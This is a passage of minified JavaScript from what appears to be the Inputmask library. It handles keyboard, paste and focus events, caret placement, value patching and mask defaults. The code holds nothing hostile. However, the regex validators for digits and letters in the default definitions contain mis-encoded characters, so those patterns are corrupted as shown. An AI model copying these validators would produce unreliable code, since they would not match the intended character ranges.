(t.placeholder !== e) { t.placeholder = e; if (t.placeholder === "") t.removeAttribute("placeholder") } } var Y = { on: function t(e, n, s) { var i = function t(e) { var n = this; if (n.inputmask === rt && this.nodeName !== "FORM") { var i = at.data(n, "_inputmask_opts"); if (i) new ht(i).mask(n); else Y.off(n) } else if (e.type !== "setvalue" && this.nodeName !== "FORM" && (n.disabled || n.readOnly && !(e.type === "keydown" && e.ctrlKey && e.keyCode === 67 || O.tabThrough === false && e.keyCode === ht.keyCode.TAB))) { e.preventDefault() } else { switch (e.type) { case "input": if (c === true) { c = false; return e.preventDefault() } if (ct) { var o = arguments; setTimeout(function () { s.apply(n, o); M(n, n.inputmask.caretPos, rt, true) }, 0); return false } break; case "keydown": r = false; c = false; break; case "keypress": if (r === true) { return e.preventDefault() } r = true; break; case "click": if (It || ut) { var o = arguments; setTimeout(function () { s.apply(n, o) }, 0); return false } break }var a = s.apply(n, arguments); if (a === false) { e.preventDefault(); e.stopPropagation() } return a } }; e.inputmask.events[n] = e.inputmask.events[n] || []; e.inputmask.events[n].push(i); if (at.inArray(n, ["submit", "reset"]) !== -1) { if (e.form !== null) at(e.form).on(n, i) } else { at(e).on(n, i) } }, off: function t(i, e) { if (i.inputmask && i.inputmask.events) { var n; if (e) { n = []; n[e] = i.inputmask.events[e] } else { n = i.inputmask.events } at.each(n, function (t, e) { while (e.length > 0) { var n = e.pop(); if (at.inArray(t, ["submit", "reset"]) !== -1) { if (i.form !== null) at(i.form).off(t, n) } else { at(i).off(t, n) } } delete i.inputmask.events[t] }) } } }; var V = { keydownEvent: function t(e) { var n = this, i = at(n), o = e.keyCode, a = M(n); if (o === ht.keyCode.BACKSPACE || o === ht.keyCode.DELETE || ut && o === ht.keyCode.BACKSPACE_SAFARI || e.ctrlKey && o === ht.keyCode.X && !dt("cut")) { e.preventDefault(); J(n, o, a); E(n, w(true), _().p, e, n.inputmask._valueGet() !== w().join("")) } else if (o === ht.keyCode.END || o === ht.keyCode.PAGE_DOWN) { e.preventDefault(); var s = T(v()); M(n, e.shiftKey ? a.begin : s, s, true) } else if (o === ht.keyCode.HOME && !e.shiftKey || o === ht.keyCode.PAGE_UP) { e.preventDefault(); M(n, 0, e.shiftKey ? a.begin : 0, true) } else if ((O.undoOnEscape && o === ht.keyCode.ESCAPE || o === 90 && e.ctrlKey) && e.altKey !== true) { L(n, true, false, p.split("")); i.trigger("click") } else if (o === ht.keyCode.INSERT && !(e.shiftKey || e.ctrlKey)) { O.insertMode = !O.insertMode; n.setAttribute("im-insert", O.insertMode) } else if (O.tabThrough === true && o === ht.keyCode.TAB) { if (e.shiftKey === true) { if (F(a.begin).match.fn === null) { a.begin = T(a.begin) } a.end = H(a.begin, true); a.begin = H(a.end, true) } else { a.begin = T(a.begin, true); a.end = T(a.begin, true); if (a.end < _().maskLength) a.end-- } if (a.begin < _().maskLength) { e.preventDefault(); M(n, a.begin, a.end) } } O.onKeyDown.call(this, e, w(), M(n).begin, O); f = at.inArray(o, O.ignorables) !== -1 }, keypressEvent: function t(e, n, i, o, a) { var s = this, r = at(s), g = e.which || e.charCode || e.keyCode; if (n !== true && !(e.ctrlKey && e.altKey) && (e.ctrlKey || e.metaKey || f)) { if (g === ht.keyCode.ENTER && p !== w().join("")) { p = w().join(""); setTimeout(function () { r.trigger("change") }, 0) } return true } else { if (g) { if (g === 46 && e.shiftKey === false && O.radixPoint !== "") g = O.radixPoint.charCodeAt(0); var l = n ? { begin: a, end: a } : M(s), c, I = String.fromCharCode(g), u = 0; if (O._radixDance && O.numericInput) { var h = w().indexOf(O.radixPoint.charAt(0)) + 1; if (l.begin <= h) { if (g === O.radixPoint.charCodeAt(0)) u = 1; l.begin -= 1; l.end -= 1 } } _().writeOutBuffer = true; var d = Z(l, I, o); if (d !== false) { y(true); c = d.caret !== rt ? d.caret : T(d.pos.begin ? d.pos.begin : d.pos); _().p = c } c = (O.numericInput && d.caret === rt ? H(c) : c) + u; if (i !== false) { setTimeout(function () { O.onKeyValidation.call(s, g, d, O) }, 0); if (_().writeOutBuffer && d !== false) { var C = w(); E(s, C, c, e, n !== true) } } e.preventDefault(); if (n) { if (d !== false) d.forwardPosition = c; return d } } } }, pasteEvent: function t(e) { var n = this, i = e.originalEvent || e, o = at(n), a = n.inputmask._valueGet(true), s = M(n), r; if (A) { r = s.end; s.end = s.begin; s.begin = r } var g = a.substr(0, s.begin), l = a.substr(s.end, a.length); if (g === (A ? G().reverse() : G()).slice(0, s.begin).join("")) g = ""; if (l === (A ? G().reverse() : G()).slice(s.end).join("")) l = ""; if (st.clipboardData && st.clipboardData.getData) { a = g + st.clipboardData.getData("Text") + l } else if (i.clipboardData && i.clipboardData.getData) { a = g + i.clipboardData.getData("text/plain") + l } else return true; var c = a; if (at.isFunction(O.onBeforePaste)) { c = O.onBeforePaste.call(I, a, O); if (c === false) { return e.preventDefault() } if (!c) { c = a } } L(n, false, false, c.toString().split("")); E(n, w(), T(v()), e, p !== w().join("")); return e.preventDefault() }, inputFallBackEvent: function t(e) { function n(t, e, n) { if (e.charAt(n.begin - 1) === "." && O.radixPoint !== "") { e = e.split(""); e[n.begin - 1] = O.radixPoint.charAt(0); e = e.join("") } return e } function i(t, e, n) { if (It) { var i = e.replace(w().join(""), ""); if (i.length === 1) { var o = e.split(""); o.splice(n.begin, 0, i); e = o.join("") } } return e } var o = this, a = o.inputmask._valueGet(); if (w().join("") !== a) { var s = M(o); a = n(o, a, s); a = i(o, a, s); if (w().join("") !== a) { var r = w().join(""), g = !O.numericInput && a.length > r.length ? -1 : 0, l = a.substr(0, s.begin), c = a.substr(s.begin), I = r.substr(0, s.begin + g), u = r.substr(s.begin + g); var h = s, d = "", C = false; if (l !== I) { var A = (C = l.length >= I.length) ? l.length : I.length, p; for (p = 0; l.charAt(p) === I.charAt(p) && p < A; p++) { } if (C) { h.begin = p - g; d += l.slice(p, h.end) } } if (c !== u) { if (c.length > u.length) { d += c.slice(0, 1) } else { if (c.length < u.length) { h.end += u.length - c.length; if (!C && O.radixPoint !== "" && c === "" && l.charAt(h.begin + g - 1) === O.radixPoint) { h.begin--; d = O.radixPoint } } } } E(o, w(), { begin: h.begin + g, end: h.end + g }); if (d.length > 0) { at.each(d.split(""), function (t, e) { var n = new at.Event("keypress"); n.which = e.charCodeAt(0); f = false; V.keypressEvent.call(o, n) }) } else { if (h.begin === h.end - 1) { h.begin = H(h.begin + 1); if (h.begin === h.end - 1) { M(o, h.begin) } else { M(o, h.begin, h.end) } } var m = new at.Event("keydown"); m.keyCode = O.numericInput ? ht.keyCode.BACKSPACE : ht.keyCode.DELETE; V.keydownEvent.call(o, m) } e.preventDefault() } } }, beforeInputEvent: function t(e) { if (e.cancelable) { var i = this; switch (e.inputType) { case "insertText": at.each(e.data.split(""), function (t, e) { var n = new at.Event("keypress"); n.which = e.charCodeAt(0); f = false; V.keypressEvent.call(i, n) }); return e.preventDefault(); case "deleteContentBackward": var n = new at.Event("keydown"); n.keyCode = ht.keyCode.BACKSPACE; V.keydownEvent.call(i, n); return e.preventDefault(); case "deleteContentForward": var n = new at.Event("keydown"); n.keyCode = ht.keyCode.DELETE; V.keydownEvent.call(i, n); return e.preventDefault() } } }, setValueEvent: function t(e) { this.inputmask.refreshValue = false; var n = this, i = e && e.detail ? e.detail[0] : arguments[1], i = i || n.inputmask._valueGet(true); if (at.isFunction(O.onBeforeMask)) i = O.onBeforeMask.call(I, i, O) || i; i = i.toString().split(""); L(n, true, false, i); p = w().join(""); if ((O.clearMaskOnLostFocus || O.clearIncomplete) && n.inputmask._valueGet() === G().join("")) { n.inputmask._valueSet("") } }, focusEvent: function t(e) { var n = this, i = n.inputmask._valueGet(); if (O.showMaskOnFocus) { if (i !== w().join("")) { E(n, w(), T(v())) } else if (o === false) { M(n, T(v())) } } if (O.positionCaretOnTab === true && o === false) { V.clickEvent.apply(n, [e, true]) } p = w().join("") }, mouseleaveEvent: function t(e) { var n = this; o = false; if (O.clearMaskOnLostFocus && gt.activeElement !== n) { g(n, s) } }, clickEvent: function t(e, l) { function c(t) { if (O.radixPoint !== "") { var e = _().validPositions; if (e[t] === rt || e[t].input === R(t)) { if (t < T(-1)) return true; var n = at.inArray(O.radixPoint, w()); if (n !== -1) { for (var i in e) { if (n < i && e[i].input !== R(i)) { return false } } return true } } } return false } var I = this; setTimeout(function () { if (gt.activeElement === I) { var t = M(I); if (l) { if (A) { t.end = t.begin } else { t.begin = t.end } } if (t.begin === t.end) { switch (O.positionCaretOnClick) { case "none": break; case "select": M(I, 0, w().length); break; case "ignore": M(I, T(v())); break; case "radixFocus": if (c(t.begin)) { var e = w().join("").indexOf(O.radixPoint); M(I, O.numericInput ? T(e) : e); break } default: var n = t.begin, i = v(n, true), o = T(i); if (n < o) { M(I, !N(n, true) && !N(n - 1, true) ? T(n) : n) } else { var a = _().validPositions[i], s = b(o, a ? a.match.locator : rt, a), r = R(o, s.match); if (r !== "" && w()[o] !== r && s.match.optionalQuantifier !== true && s.match.newBlockMarker !== true || !N(o, O.keepStatic) && s.match.def === r) { var g = T(o); if (n >= g || n === o) { o = g } } M(I, o) } break } } } }, 0) }, cutEvent: function t(e) { var n = this, i = at(n), o = M(n), a = e.originalEvent || e; var s = st.clipboardData || a.clipboardData, r = A ? w().slice(o.end, o.begin) : w().slice(o.begin, o.end); s.setData("text", A ? r.reverse().join("") : r.join("")); if (gt.execCommand) gt.execCommand("copy"); J(n, ht.keyCode.DELETE, o); E(n, w(), _().p, e, p !== w().join("")) }, blurEvent: function t(e) { var n = at(this), i = this; if (i.inputmask) { g(i, s); var o = i.inputmask._valueGet(), a = w().slice(); if (o !== "" || d !== rt) { if (O.clearMaskOnLostFocus) { if (v() === -1 && o === G().join("")) { a = [] } else { P(a) } } if (K(a) === false) { setTimeout(function () { n.trigger("incomplete") }, 0); if (O.clearIncomplete) { y(); if (O.clearMaskOnLostFocus) { a = [] } else { a = G().slice() } } } E(i, a, rt, e) } if (p !== w().join("")) { p = a.join(""); n.trigger("change") } } }, mouseenterEvent: function t(e) { var n = this; o = true; if (gt.activeElement !== n && O.showMaskOnHover) { g(n, (A ? w().slice().reverse() : w()).join("")) } }, submitEvent: function t(e) { if (p !== w().join("")) { a.trigger("change") } if (O.clearMaskOnLostFocus && v() === -1 && l.inputmask._valueGet && l.inputmask._valueGet() === G().join("")) { l.inputmask._valueSet("") } if (O.clearIncomplete && K(w()) === false) { l.inputmask._valueSet("") } if (O.removeMaskOnSubmit) { l.inputmask._valueSet(l.inputmask.unmaskedvalue(), true); setTimeout(function () { E(l, w()) }, 0) } }, resetEvent: function t(e) { l.inputmask.refreshValue = true; setTimeout(function () { a.trigger("setvalue") }, 0) } }; function L(o, t, a, e, n) { var s = this || o.inputmask, r = e.slice(), g = "", l = -1, c = rt; function I(t, e) { var n = h(true, 0, false).slice(t, T(t)).join("").replace(/'/g, "").indexOf(e); return n !== -1 && !N(t) && (F(t).match.nativeDef === e.charAt(0) || F(t).match.fn === null && F(t).match.nativeDef === "'" + e.charAt(0) || F(t).match.nativeDef === " " && (F(t + 1).match.nativeDef === e.charAt(0) || F(t + 1).match.fn === null && F(t + 1).match.nativeDef === "'" + e.charAt(0))) } y(); if (!a && O.autoUnmask !== true) { var i = G().slice(0, T(-1)).join(""), u = r.join("").match(new RegExp("^" + ht.escapeRegex(i), "g")); if (u && u.length > 0) { r.splice(0, u.length * i.length); l = T(l) } } else { l = T(l) } if (l === -1) { _().p = T(l); l = 0 } else _().p = l; s.caretPos = { begin: l }; at.each(r, function (t, e) { if (e !== rt) { if (_().validPositions[t] === rt && r[t] === R(t) && N(t, true) && Z(t, r[t], true, rt, rt, true) === false) { _().p++ } else { var n = new at.Event("_checkval"); n.which = e.charCodeAt(0); g += e; var i = v(rt, true); if (!I(l, g)) { c = V.keypressEvent.call(o, n, true, false, a, s.caretPos.begin); if (c) { l = s.caretPos.begin + 1; g = "" } } else { c = V.keypressEvent.call(o, n, true, false, a, i + 1) } if (c) { E(rt, w(), c.forwardPosition, n, false); s.caretPos = { begin: c.forwardPosition, end: c.forwardPosition } } } } }); if (t) E(o, w(), c ? c.forwardPosition : rt, n || new at.Event("checkval"), n && n.type === "input") } function n(t) { if (t) { if (t.inputmask === rt) { return t.value } if (t.inputmask && t.inputmask.refreshValue) { V.setValueEvent.call(t) } } var e = [], n = _().validPositions; for (var i in n) { if (n[i].match && n[i].match.fn != null) { e.push(n[i].input) } } var o = e.length === 0 ? "" : (A ? e.reverse() : e).join(""); if (at.isFunction(O.onUnMask)) { var a = (A ? w().slice().reverse() : w()).join(""); o = O.onUnMask.call(I, a, o, O) } return o } function M(t, e, n, i) { function o(t) { if (A && typeof t === "number" && (!O.greedy || O.placeholder !== "") && l) { t = l.inputmask._valueGet().length - t } return t } var a; if (e !== rt) { if (at.isArray(e)) { n = A ? e[0] : e[1]; e = A ? e[1] : e[0] } if (e.begin !== rt) { n = A ? e.begin : e.end; e = A ? e.end : e.begin } if (typeof e === "number") { e = i ? e : o(e); n = i ? n : o(n); n = typeof n == "number" ? n : e; var s = parseInt(((t.ownerDocument.defaultView || st).getComputedStyle ? (t.ownerDocument.defaultView || st).getComputedStyle(t, null) : t.currentStyle).fontSize) * n; t.scrollLeft = s > t.scrollWidth ? s : 0; t.inputmask.caretPos = { begin: e, end: n }; if (t === gt.activeElement) { if ("selectionStart" in t) { t.selectionStart = e; t.selectionEnd = n } else if (st.getSelection) { a = gt.createRange(); if (t.firstChild === rt || t.firstChild === null) { var r = gt.createTextNode(""); t.appendChild(r) } a.setStart(t.firstChild, e < t.inputmask._valueGet().length ? e : t.inputmask._valueGet().length); a.setEnd(t.firstChild, n < t.inputmask._valueGet().length ? n : t.inputmask._valueGet().length); a.collapse(true); var g = st.getSelection(); g.removeAllRanges(); g.addRange(a) } else if (t.createTextRange) { a = t.createTextRange(); a.collapse(true); a.moveEnd("character", n); a.moveStart("character", e); a.select() } $(t, { begin: e, end: n }) } } } else { if ("selectionStart" in t) { e = t.selectionStart; n = t.selectionEnd } else if (st.getSelection) { a = st.getSelection().getRangeAt(0); if (a.commonAncestorContainer.parentNode === t || a.commonAncestorContainer === t) { e = a.startOffset; n = a.endOffset } } else if (gt.selection && gt.selection.createRange) { a = gt.selection.createRange(); e = 0 - a.duplicate().moveStart("character", -t.inputmask._valueGet().length); n = e + a.text.length } return { begin: i ? e : o(e), end: i ? n : o(n) } } } function z(t) { var e = h(true, v(), true, true), n = e.length, i, o = v(), a = {}, s = _().validPositions[o], r = s !== rt ? s.locator.slice() : rt, g; for (i = o + 1; i < e.length; i++) { g = b(i, r, i - 1); r = g.locator.slice(); a[i] = at.extend(true, {}, g) } var l = s && s.alternation !== rt ? s.locator[s.alternation] : rt; for (i = n - 1; i > o; i--) { g = a[i]; if ((g.match.optionality || g.match.optionalQuantifier && g.match.newBlockMarker || l && (l !== a[i].locator[s.alternation] && g.match.fn != null || g.match.fn === null && g.locator[s.alternation] && k(g.locator[s.alternation].toString().split(","), l.toString().split(",")) && Q(i)[0].def !== "")) && e[i] === R(i, g.match)) { n-- } else break } return t ? { l: n, def: a[n] ? a[n].match : rt } : n } function P(t) { t.length = 0; var e = h(true, 0, true, rt, true), n, i; while (n = e.shift(), n !== rt) { t.push(n) } return t } function K(t) { if (at.isFunction(O.isComplete)) return O.isComplete(t, O); if (O.repeat === "*") return rt; var e = false, n = z(true), i = H(n.l); if (n.def === rt || n.def.newBlockMarker || n.def.optionality || n.def.optionalQuantifier) { e = true; for (var o = 0; o <= i; o++) { var a = b(o).match; if (a.fn !== null && _().validPositions[o] === rt && a.optionality !== true && a.optionalQuantifier !== true || a.fn === null && t[o] !== R(o, a)) { e = false; break } } } return e } function J(t, e, n, i, o) { if (O.numericInput || A) { if (e === ht.keyCode.BACKSPACE) { e = ht.keyCode.DELETE } else if (e === ht.keyCode.DELETE) { e = ht.keyCode.BACKSPACE } if (A) { var a = n.end; n.end = n.begin; n.begin = a } } if (e === ht.keyCode.BACKSPACE && n.end - n.begin < 1) { n.begin = H(n.begin); if (_().validPositions[n.begin] !== rt && _().validPositions[n.begin].input === O.groupSeparator) { n.begin-- } } else if (e === ht.keyCode.DELETE && n.begin === n.end) { n.end = N(n.end, true) && _().validPositions[n.end] && _().validPositions[n.end].input !== O.radixPoint ? n.end + 1 : T(n.end) + 1; if (_().validPositions[n.begin] !== rt && _().validPositions[n.begin].input === O.groupSeparator) { n.end++ } } W(n); if (i !== true && O.keepStatic !== false || O.regex !== null) { var s = D(true); if (s) { var r = s.caret !== rt ? s.caret : s.pos ? T(s.pos.begin ? s.pos.begin : s.pos) : v(-1, true); if (e !== ht.keyCode.DELETE || n.begin > r) { n.begin == r } } } var g = v(n.begin, true); if (g < n.begin || n.begin === -1) { _().p = T(g) } else if (i !== true) { _().p = n.begin; if (o !== true) { while (_().p < g && _().validPositions[_().p] === rt) { _().p++ } } } } function j(l) { var c = (l.ownerDocument.defaultView || st).getComputedStyle(l, null); function e(t) { var e = gt.createElement("span"), n; for (var i in c) { if (isNaN(i) && i.indexOf("font") !== -1) { e.style[i] = c[i] } } e.style.textTransform = c.textTransform; e.style.letterSpacing = c.letterSpacing; e.style.position = "absolute"; e.style.height = "auto"; e.style.width = "auto"; e.style.visibility = "hidden"; e.style.whiteSpace = "nowrap"; gt.body.appendChild(e); var o = l.inputmask._valueGet(), a = 0, s; for (n = 0, s = o.length; n <= s; n++) { e.innerHTML += o.charAt(n) || "_"; if (e.offsetWidth >= t) { var r = t - a; var g = e.offsetWidth - t; e.innerHTML = o.charAt(n); r -= e.offsetWidth / 3; n = r < g ? n - 1 : n; break } a = e.offsetWidth } gt.body.removeChild(e); return n } var t = gt.createElement("div"); t.style.width = c.width; t.style.textAlign = c.textAlign; d = gt.createElement("div"); l.inputmask.colorMask = d; d.className = "im-colormask"; l.parentNode.insertBefore(d, l); l.parentNode.removeChild(l); d.appendChild(l); d.appendChild(t); l.style.left = t.offsetLeft + "px"; at(d).on("mouseleave", function (t) { return V.mouseleaveEvent.call(l, [t]) }); at(d).on("mouseenter", function (t) { return V.mouseenterEvent.call(l, [t]) }); at(d).on("click", function (t) { M(l, e(t.clientX)); return V.clickEvent.call(l, [t]) }) } function $(t, e, n) { var i = [], o = false, a, s, r, g = 0; function l(t) { if (t === rt) t = ""; if (!o && (a.fn === null || s.input === rt)) { o = true; i.push("<span class='im-static'>" + t) } else if (o && (a.fn !== null && s.input !== rt || a.def === "")) { o = false; var e = i.length; i[e - 1] = i[e - 1] + "</span>"; i.push(t) } else i.push(t) } function c() { if (gt.activeElement === t) { i.splice(e.begin, 0, e.begin === e.end || e.end > _().maskLength ? '<mark class="im-caret" style="border-right-width: 1px;border-right-style: solid;">' : '<mark class="im-caret-select">'); i.splice(e.end + 1, 0, "</mark>") } } if (d !== rt) { var I = w(); if (e === rt) { e = M(t) } else if (e.begin === rt) { e = { begin: e, end: e } } if (n !== true) { var u = v(); do { if (_().validPositions[g]) { s = _().validPositions[g]; a = s.match; r = s.locator.slice(); l(I[g]) } else { s = b(g, r, g - 1); a = s.match; r = s.locator.slice(); if (O.jitMasking === false || g < u || typeof O.jitMasking === "number" && isFinite(O.jitMasking) && O.jitMasking > g) { l(R(g, a)) } else o = false } g++ } while ((m === rt || g < m) && (a.fn !== null || a.def !== "") || u > g || o); if (o) l(); c() } var h = d.getElementsByTagName("div")[0]; h.innerHTML = i.join(""); t.inputmask.positionColorMask(t, h) } } function i(t) { function e(t, g) { function e(t) { var e; var n; function i(t) { if (at.valHooks && (at.valHooks[t] === rt || at.valHooks[t].inputmaskpatch !== true)) { var i = at.valHooks[t] && at.valHooks[t].get ? at.valHooks[t].get : function (t) { return t.value }; var a = at.valHooks[t] && at.valHooks[t].set ? at.valHooks[t].set : function (t, e) { t.value = e; return t }; at.valHooks[t] = { get: function t(e) { if (e.inputmask) { if (e.inputmask.opts.autoUnmask) { return e.inputmask.unmaskedvalue() } else { var n = i(e); return v(rt, rt, e.inputmask.maskset.validPositions) !== -1 || g.nullable !== true ? n : "" } } else return i(e) }, set: function t(e, n) { var i = at(e), o; o = a(e, n); if (e.inputmask) { i.trigger("setvalue", [n]) } return o }, inputmaskpatch: true } } } function o() { if (this.inputmask) { return this.inputmask.opts.autoUnmask ? this.inputmask.unmaskedvalue() : v() !== -1 || g.nullable !== true ? gt.activeElement === this && g.clearMaskOnLostFocus ? (A ? P(w().slice()).reverse() : P(w().slice())).join("") : e.call(this) : "" } else return e.call(this) } function a(t) { n.call(this, t); if (this.inputmask) { at(this).trigger("setvalue", [t]) } } function s(t) { Y.on(t, "mouseenter", function (t) { var e = at(this), n = this, i = n.inputmask._valueGet(); if (i !== w().join("")) { e.trigger("setvalue") } }) } if (!t.inputmask.__valueGet) { if (g.noValuePatching !== true) { if (Object.getOwnPropertyDescriptor) { if (typeof Object.getPrototypeOf !== "function") { Object.getPrototypeOf = At("test".__proto__) === "object" ? function (t) { return t.__proto__ } : function (t) { return t.constructor.prototype } } var r = Object.getPrototypeOf ? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(t), "value") : rt; if (r && r.get && r.set) { e = r.get; n = r.set; Object.defineProperty(t, "value", { get: o, set: a, configurable: true }) } else if (t.tagName !== "INPUT") { e = function t() { return this.textContent }; n = function t(e) { this.textContent = e }; Object.defineProperty(t, "value", { get: o, set: a, configurable: true }) } } else if (gt.__lookupGetter__ && t.__lookupGetter__("value")) { e = t.__lookupGetter__("value"); n = t.__lookupSetter__("value"); t.__defineGetter__("value", o); t.__defineSetter__("value", a) } t.inputmask.__valueGet = e; t.inputmask.__valueSet = n } t.inputmask._valueGet = function (t) { return A && t !== true ? e.call(this.el).split("").reverse().join("") : e.call(this.el) }; t.inputmask._valueSet = function (t, e) { n.call(this.el, t === null || t === rt ? "" : e !== true && A ? t.split("").reverse().join("") : t) }; if (e === rt) { e = function t() { return this.value }; n = function t(e) { this.value = e }; i(t.type); s(t) } } } var n = t.getAttribute("type"); var i = t.tagName === "INPUT" && at.inArray(n, g.supportsInputType) !== -1 || t.isContentEditable || t.tagName === "TEXTAREA"; if (!i) { if (t.tagName === "INPUT") { var o = gt.createElement("input"); o.setAttribute("type", n); i = o.type === "text"; o = null } else i = "partial" } if (i !== false) { e(t) } else t.inputmask = rt; return i } Y.off(t); var n = e(t, O); if (n !== false) { l = t; a = at(l); s = l.placeholder; m = l !== rt ? l.maxLength : rt; if (m === -1) m = rt; if (O.colorMask === true) { j(l) } if (ct) { if ("inputmode" in l) { l.inputmode = O.inputmode; l.setAttribute("inputmode", O.inputmode) } if (O.disablePredictiveText === true) { if ("autocorrect" in l) { l.autocorrect = false } else { if (O.colorMask !== true) { j(l) } l.type = "password" } } } if (n === true) { l.setAttribute("im-insert", O.insertMode); Y.on(l, "submit", V.submitEvent); Y.on(l, "reset", V.resetEvent); Y.on(l, "blur", V.blurEvent); Y.on(l, "focus", V.focusEvent); if (O.colorMask !== true) { Y.on(l, "click", V.clickEvent); Y.on(l, "mouseleave", V.mouseleaveEvent); Y.on(l, "mouseenter", V.mouseenterEvent) } Y.on(l, "paste", V.pasteEvent); Y.on(l, "cut", V.cutEvent); Y.on(l, "complete", O.oncomplete); Y.on(l, "incomplete", O.onincomplete); Y.on(l, "cleared", O.oncleared); if (!ct && O.inputEventOnly !== true) { Y.on(l, "keydown", V.keydownEvent); Y.on(l, "keypress", V.keypressEvent) } else { l.removeAttribute("maxLength") } Y.on(l, "input", V.inputFallBackEvent); Y.on(l, "beforeinput", V.beforeInputEvent) } Y.on(l, "setvalue", V.setValueEvent); p = G().join(""); if (l.inputmask._valueGet(true) !== "" || O.clearMaskOnLostFocus === false || gt.activeElement === l) { var i = at.isFunction(O.onBeforeMask) ? O.onBeforeMask.call(I, l.inputmask._valueGet(true), O) || l.inputmask._valueGet(true) : l.inputmask._valueGet(true); if (i !== "") L(l, true, false, i.split("")); var o = w().slice(); p = o.join(""); if (K(o) === false) { if (O.clearIncomplete) { y() } } if (O.clearMaskOnLostFocus && gt.activeElement !== l) { if (v() === -1) { o = [] } else { P(o) } } if (O.clearMaskOnLostFocus === false || O.showMaskOnFocus && gt.activeElement === l || l.inputmask._valueGet(true) !== "") E(l, o); if (gt.activeElement === l) { M(l, T(v())) } } } } var q; if (t !== rt) { switch (t.action) { case "isComplete": l = t.el; return K(w()); case "unmaskedvalue": if (l === rt || t.value !== rt) { q = t.value; q = (at.isFunction(O.onBeforeMask) ? O.onBeforeMask.call(I, q, O) || q : q).split(""); L.call(this, rt, false, false, q); if (at.isFunction(O.onBeforeWrite)) O.onBeforeWrite.call(I, rt, w(), 0, O) } return n(l); case "mask": i(l); break; case "format": q = (at.isFunction(O.onBeforeMask) ? O.onBeforeMask.call(I, t.value, O) || t.value : t.value).split(""); L.call(this, rt, true, false, q); if (t.metadata) { return { value: A ? w().slice().reverse().join("") : w().join(""), metadata: Ct.call(this, { action: "getmetadata" }, e, O) } } return A ? w().slice().reverse().join("") : w().join(""); case "isValid": if (t.value) { q = t.value.split(""); L.call(this, rt, true, true, q) } else { t.value = w().join("") } var tt = w(); var et = z(), nt = tt.length - 1; for (; nt > et; nt--) { if (N(nt)) break } tt.splice(et, nt + 1 - et); return K(tt) && t.value === w().join(""); case "getemptymask": return G().join(""); case "remove": if (l && l.inputmask) { at.data(l, "_inputmask_opts", null); a = at(l); l.inputmask._valueSet(O.autoUnmask ? n(l) : l.inputmask._valueGet(true)); Y.off(l); if (l.inputmask.colorMask) { d = l.inputmask.colorMask; d.removeChild(l); d.parentNode.insertBefore(l, d); d.parentNode.removeChild(d) } var it; if (Object.getOwnPropertyDescriptor && Object.getPrototypeOf) { it = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(l), "value"); if (it) { if (l.inputmask.__valueGet) { Object.defineProperty(l, "value", { get: l.inputmask.__valueGet, set: l.inputmask.__valueSet, configurable: true }) } } } else if (gt.__lookupGetter__ && l.__lookupGetter__("value")) { if (l.inputmask.__valueGet) { l.__defineGetter__("value", l.inputmask.__valueGet); l.__defineSetter__("value", l.inputmask.__valueSet) } } l.inputmask = rt } return l; break; case "getmetadata": if (at.isArray(e.metadata)) { var ot = h(true, 0, false).join(""); at.each(e.metadata, function (t, e) { if (e.mask === ot) { ot = e; return false } }); return ot } return e.metadata } } } return ht.prototype = { dataAttribute: "data-inputmask", defaults: { placeholder: "_", optionalmarker: ["[", "]"], quantifiermarker: ["{", "}"], groupmarker: ["(", ")"], alternatormarker: "|", escapeChar: "\\", mask: null, regex: null, oncomplete: at.noop, onincomplete: at.noop, oncleared: at.noop, repeat: 0, greedy: !1, autoUnmask: !1, removeMaskOnSubmit: !1, clearMaskOnLostFocus: !0, insertMode: !0, clearIncomplete: !1, alias: null, onKeyDown: at.noop, onBeforeMask: null, onBeforePaste: function (t, e) { return at.isFunction(e.onBeforeMask) ? e.onBeforeMask.call(this, t, e) : t }, onBeforeWrite: null, onUnMask: null, showMaskOnFocus: !0, showMaskOnHover: !0, onKeyValidation: at.noop, skipOptionalPartCharacter: " ", numericInput: !1, rightAlign: !1, undoOnEscape: !0, radixPoint: "", _radixDance: !1, groupSeparator: "", keepStatic: null, positionCaretOnTab: !0, tabThrough: !1, supportsInputType: ["text", "tel", "url", "password", "search"], ignorables: [8, 9, 13, 19, 27, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 93, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 0, 229], isComplete: null, preValidation: null, postValidation: null, staticDefinitionSymbol: rt, jitMasking: !1, nullable: !0, inputEventOnly: !1, noValuePatching: !1, positionCaretOnClick: "lvp", casing: null, inputmode: "verbatim", colorMask: !1, disablePredictiveText: !1, importDataAttributes: !0, shiftPositions: !0 }, definitions: { 9: { validator: "[0-9ï¼-ï¼]", definitionSymbol: "*" }, a: { validator: "[A-Za-zÐ-ÑÐÑÃ-Ã¿Âµ]", definitionSymbol: "*" }, "*": { validator: "[0-9ï¼-ï¼A-Za-zÐ-ÑÐÑÃ-Ã¿Âµ]" } }, aliases: {}, masksCache: {}, mask: function (t) { var o = this; return "string" == typeof t && (t = gt.getElementById(t) || gt.querySelectorAll(t)), t = t.nodeName ? [t] : t, at.each(t, function (t, e) { var n, i = at.extend(!0, {}, o.opts); !function (n, t, i, o) { if (!0 === t.importDataAttributes) { var e, a, s, r, g = n.getAttribute(o), l = function (t, e) { null !== (e = e !== rt ? e : n.getAttribute(o + "-" + t)) && ("string" == typeof e && (0 === t.indexOf("on") ? e = st[e] : "false" === e ? e = !1 : "true" === e && (e = !0)), i[t] = e) }; if (g && "" !== g && (g = g.replace(/'/g, '"'), a = JSON.parse("{" + g + "}")), a) for (r in s = rt, a) if ("alias" === r.toLowerCase()) { s = a[r]; break } for (e in l("alias", s), i.alias && c(i.alias, i, t), t) { if (a) for (r in s = rt, a) if (r.toLowerCase() === e.toLowerCase()) { s = a[r]; break } l(e, s) } } return at.extend(!0, t, i), "rtl" !== n.dir && !t.rightAlign || (n.style.textAlign = "right"), "rtl" !== n.dir && !t.numericInput || (n.dir = "ltr", n.removeAttribute("dir"), t.isRTL = !0), Object.keys(i).length }(e, i, at.extend(!0, {}, o.userOptions), o.dataAttribute) || (n = a(i, o.noMasksCache)) !== rt && (e.inputmask !== rt && (e.inputmask.opts.autoUnmask = !0, e.inputmask.remove()), e.inputmask = new ht(rt, rt, !0), e.inputmask.opts = i, e.inputmask.noMasksCache = o.noMasksCache, e.inputmask.userOptions = at.extend(!0, {}, o.userOptions), e.inputmask.isRTL = i.isRTL || i.numericInput, (e.inputmask.el = e).inputmask.maskset = n, at.data(e, "_inputmask_opts", i), Ct.call(e.inputmask, { action: "mask" })) }), t && t[0] && t[0].inputmask || this }, option: function (t, e) { return "string" == typeof t ? 